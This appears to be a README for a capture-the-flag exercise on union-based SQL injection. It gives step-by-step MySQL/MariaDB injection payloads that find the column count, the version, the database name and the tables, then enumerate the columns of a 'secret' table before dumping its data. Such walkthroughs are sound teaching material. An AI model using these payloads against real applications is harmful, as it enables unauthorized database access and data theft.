This repo was created for a UNION-BASED SQL Injection CTF 

To solve this you need to go through this steps : 

* First, Find the number of columns used : 

' UNION SELECT 1 -- - 
' UNION SELECT 1,2 -- - 
...

' UNION SELECT 1,2,3,4 -- - --> We have 4 columns. 

* After this, we have to find the SGBD used :

' UNION SELECT 1,2,3,@@version -- - --> MariaDB => MySQL

* Find the Database name : 

' UNION SELECT 1,2,3,DATABASE()-- - => sqli : Nom de la BDD SQL en cours d'utilisation

* Find the tables of that database : 

' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli' -- -

* Find the columns names of secret table : 

' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'secret' -- -

Now we can just retrieve everything using and UNION request.

